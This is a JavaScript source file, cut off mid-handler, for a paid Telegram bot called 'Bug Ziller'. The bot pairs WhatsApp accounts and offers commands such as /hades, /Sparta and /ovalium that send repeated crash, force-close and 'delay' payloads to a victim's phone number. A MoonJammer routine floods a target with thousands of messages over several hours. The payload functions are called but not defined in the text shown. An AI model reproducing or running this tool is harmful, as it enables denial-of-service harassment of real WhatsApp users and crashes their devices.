const {
    default: makeWASocket,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("qudbail");

// ---------- ( Set Const ) ----------- \\
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/KyyOfficiall/database/refs/heads/main/tokens.json";
const ONLY_FILE = path.join(__dirname, "database", "gconly.json");
const cd = path.join(__dirname, "database", "cd.json");


///==== (Random Image) =====\\\
function getRandomImage() {
const images = [
"https://files.catbox.moe/3bbkjo.jpg", 
"https://files.catbox.moe/3bbkjo.jpg",
"https://files.catbox.moe/3bbkjo.jpg",
];
  return images[Math.floor(Math.random() * images.length)];
}
// ----------------- ( Pengecekan Token ) ------------------- \\
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

   async function validateToken() {
   console.log(chalk.blue(`🔍 Memeriksa apakah token valid
`));
   
   const validTokens = await fetchValidTokens();
   if (!validTokens.includes(BOT_TOKEN)) {
   console.log(chalk.red(`
═══════════════════════════════════════════
 I'M I YOUR FATHER 😂😂🔥
═══════════════════════════════════════════
⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
   process.exit(1);
   }
   console.log(chalk.green(` あなたのトークンは有効です `));
  startBot();
  initializeWhatsAppConnections();
  }



function startBot() {
  console.log(chalk.red(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`));
console.log(chalk.blue(`
┌────────────────────────⬡
│⬡ Owner: @ Mr smile
│⬡ Version: 3.0
│⬡ Thanks To Buying BUG ZILLER
└────────────────────────⬡
`));
}
validateToken();



// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
////=== Intalasi WhatsApp ===\\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
\`\`\`
༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫  ༑\`\`\`
┌──────────────────────⬡
│▢ Menyiapkan Kode Pairing
│▢ Number: ${botNumber}
└──────────────────────⬡
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
\`\`\`
༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑\`\`\`
┌──────────────────────⬡
│▢ Memproses Connecting
│▢ Number: ${botNumber}
│▢ Status: Connecting...
└──────────────────────⬡
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`
༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑\`\`\`
┌──────────────────────⬡
│▢ Connection Gagal.
│▢ Number: ${botNumber}
│▢ Status: Gagal ❌
└──────────────────────⬡
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
\`\`\`
༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑\`\`\`
┌──────────────────────⬡
│▢ Connection Sukses
│▢ Number: ${botNumber}
│▢ Status: Sukses Connect.
└──────────────────────⬡
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber, "KYYXMOON");
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
\`\`\`
༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑\`\`\`
┌──────────────────────⬡
│▢ Code Pairing Kamu
│▢ Number: ${botNumber}
│▢ Code: ${formattedCode}
└──────────────────────⬡
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "Markdown",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`
༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑\`\`\`
┌──────────────────────⬡
│▢ Menyiapkan Kode Pairing
│▢ Number: ${botNumber}
│▢ Status: ${error.message} Error⚠️
└──────────────────────⬡
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

///=== Function Cek id ch ===\\\
async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}
// --------------------- ( Bot Setting ) ---------------------- \\

function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }

// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./database/premium.json');
            ensureFileExists('./database/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./database/premium.json', (data) => (premiumUsers = data));
    watchFile('./database/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
////==== Fungsi buat file otomatis ====\\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

if (!fs.existsSync(cd)) {
  fs.writeFileSync(cd, JSON.stringify({ time: 0, users: {} }, null, 2));
}
// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}
///===== ( Menu Utama ) =====\\\
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const chatType = msg.chat.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑\`\`\`

❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "ᴏᴡɴᴇʀ", url: "https://t.me/mr_smile_202" },
          ]
        ]
      }
    });
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const caption =
`\`\`\`
༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑\`\`\`
 𝐇𝐢 ${username} 𝐢𝐦 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 𝐂𝐫𝐚𝐟𝐭𝐞𝐝 𝐁𝐲 𝐌𝐫 𝐒𝐦𝐢𝐥𝐞

⬡ Owner : t.me/mr_smile_202
⬡ Version : 3.0 
⬡ Language :  JavaScript
⬡ Status :  ${isPremium ? "✅" : "❌"}
⬡ Runtime :  ${runtime}
`;

  const buttons = [
  [
    { text: "ᴢɪʟʟᴇʀ", callback_data: "bugshow" },
  ],
  [
    { text: "ᴠɪᴇᴡ", callback_data: "ownermenu" }
  ],
  [
    { text: "ғʀɪᴇɴᴅs", callback_data: "thanksto" },
    { text: "ᴍʀ sᴍɪʟᴇ", url: "https://t.me/mr_smile_202" }
  ]
];


  bot.sendPhoto(chatId, randomImage, {
    caption,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: buttons }
  });
});
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const randomImage = getRandomImage();
  const senderId = callbackQuery.from.id;
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";

  let newCaption = "";
  let newButtons = [];
// Handler bugmenu
  if (data === "bugshow") {
    newCaption =
`
\`\`\`
༑ 𝐀𝐭𝐭𝐚𝐜𝐤 ☇ 𝐌𝐞𝐧𝐮 ༑\`\`\`

𝐇𝐢 ${username} 𝐢𝐦 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 𝐂𝐫𝐚𝐟𝐭𝐞𝐝 𝐁𝐲 𝐌𝐫 𝐒𝐦𝐢𝐥𝐞

╔══✦❖✦══╗  𝐏𝐎𝐖𝐄𝐑 𝐂𝐌𝐃𝐒  ╔══✦❖✦══╗
┃ ☑ /hades 62xxx
┃ ⤷ Force Close Beta
┃
┃ ☑ /Sparta 62xxx
┃ ⤷ Crash Invis iOS
┃
┃ ☑ /ovalium 62xxx
┃ ⤷ Delay Hard
┃
┃ ☑ /zeus 62xxx
┃ ⤷ Gataw
┃
┃ ☑ /Coming Soon 62xxx
┃ ⤷ ???
╚══✦❖✦══╝  𝐁𝐔𝐆 𝐙𝐈𝐋𝐋𝐄𝐑 ╚══✦❖✦══╝
`;

    newButtons = [
      [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }]
    ];
  } else if (data === "ownermenu") {
   newCaption =
`
\`\`\`
༑ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ☇ 𝐌𝐞𝐧𝐮 ༑\`\`\`

𝐇𝐢 ${username} 𝐢𝐦 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 𝐂𝐫𝐚𝐟𝐭𝐞𝐝 𝐁𝐲 𝐌𝐫 𝐒𝐦𝐢𝐥𝐞

╔══✦❖✦══╗ 𝐀𝐃𝐌𝐈𝐍 𝐂𝐌𝐃𝐒 ╔══✦❖✦══╗
┃ ☑ /xpair 254xxx
┃ ☑ /addadmin ID
┃ ☑ /deladmin ID
┃ ☑ /addprem ID Time
┃ ☑ /delprem ID
┃ ☑ /listprem ID
┃ ☑ /setjeda ( s|m )
┃ ☑ /cekidch ( ID Channel )
┃ ☑ /gconly ( off|on )
╚══✦❖✦══╝ 𝐁𝐔𝐆 𝐙𝐈𝐋𝐋𝐄𝐑 ╚══✦❖✦══╝

`;

    newButtons = [
      [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }]
    ];
// Handler tqto
  } else if (data === "thanksto") {
    newCaption =
`
\`\`\`
༑ 𝐓𝐡𝐚𝐧𝐤𝐬 ☇ 𝐓𝐨 ༑\`\`\`
┌────────────────────⬡
│⬡ 𝐌𝐑 𝐒𝐌𝐈𝐋𝐄 ( Dev )
│⬡ 𝐌𝐘 𝐅𝐀𝐌𝐈𝐋𝐘 ( My Support )
│⬡ 𝐂𝐎𝐑𝐃𝐈𝐍𝐆 ( My Staff )
│⬡ 𝐓𝐘𝐋𝐄𝐑 𝐖𝐇𝐈𝐓𝐄 ( My Partner )
│⬡ 𝐗-𝐅𝐀𝐂𝐓𝐎𝐑 ( My Partner )
│⬡ 𝐒𝐔𝐁𝐑𝐀 ( Friend )
│⬡ 𝐁𝐄𝐋𝐋𝐀 𝐓𝐄𝐂𝐇 ( Friend )
│⬡ 𝐉𝐀𝐌𝐄𝐒 𝐓𝐄𝐂𝐇 ( Friend )
└────────────────────⬡
`;

    newButtons = [
      [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }]
    ];
// Handler back main
  } else if (data === "mainmenu") {
    const runtime = getBotRuntime();
    newCaption =
`\`\`\`
༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑\`\`\`
𝐇𝐢 ${username} 𝐢𝐦 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 𝐂𝐫𝐚𝐟𝐭𝐞𝐝 𝐁𝐲 𝐌𝐫 𝐒𝐦𝐢𝐥𝐞

⬡ Owner : https://t.me/mr_smile_202
⬡ Version :  3.0
⬡ Language : Javascript
⬡ Status :  ${isPremium ? "✅" : "❌"}
⬡ Runtime :  ${runtime}
`;

    newButtons = [
      [
    { text: "ᴢɪʟʟᴇʀ", callback_data: "bugshow" },
  ],
  [
    { text: "ᴠɪᴇᴡ", callback_data: "ownermenu" }
  ],
  [
    { text: "ғʀɪᴇɴᴅs", callback_data: "thanksto" },
    { text: "ᴍʀ sᴍɪʟᴇ", url: "https://t.me/mr_smile_202" }
  ]
  ];
  }

  try {
    await bot.editMessageMedia({
      type: "photo",
      media: randomImage,
      caption: newCaption,
      parse_mode: "Markdown"
    }, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: {
        inline_keyboard: newButtons
      }
    });
  } catch (err) {
    if (err.response?.body?.description?.includes("message is not modified")) {
      return bot.answerCallbackQuery(callbackQuery.id, { text: "Sudah di menu ini.", show_alert: false });
    } else {
      console.error("Gagal edit media:", err);
    }
  }

  bot.answerCallbackQuery(callbackQuery.id);
});

// ======= ( Parameter ) ======= \\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
///======= PARAMETER =========\\\
async function forcebeta(target) {
    for (let i = 0; i < 10; i++) {
    await LocaBetanew2(target);
    await ForceBetaNew(target);
    await sleep(1000);
    console.log(chalk.red(`Succes Sending Bug Force Close Beta 🐉`));
    }
    }
async function iosinvis(target) {
for (let r = 0; r < 666; r++) {
      await IosInvisibleForce(sock, target)
      await new Promise(resolve => setTimeout(resolve, 500));
    await sleep(1000);
    console.log(chalk.red(`Succes Sending Bug Crash Invis Ios 🐉`));
  }
  }
async function gtw(target) {
    for (let i = 0; i < 50; i++) {
    await EguardV1(target);
    await zepdelayv4(sock, target, true);
    await sleep(1000);
    console.log(chalk.red(`Succes Sending Bug Delay Hard🐉`));
    }
    }
async function tess(target) {
    for (let i = 0; i < 50; i++) {
    await dayLightZep(target, true);
    await sleep(1000);
    console.log(chalk.red(`Succes Sending Bug🐉`));
    }
    }
//kalo mau buat param, bisa salin aja param di atas\\

///=== Case Durstion ===\\\
async function MoonJammer(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 1000) {
            await Promise.all([
            dayLightZep(target,  true),
            dayLightZep(target, false),
            ]);
            console.log(chalk.red(`🦠 Sendded ${count}/1000 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 1000 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 1000 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

//// =====( CASE BUG 1 ) ===== \\\\
bot.onText(/\/hades (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
•༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫༑•\`\`\`
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "ᴏᴡɴᴇʀ", url: "https://t.me/mr_smile_202" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpair terlebih dahulu.`);
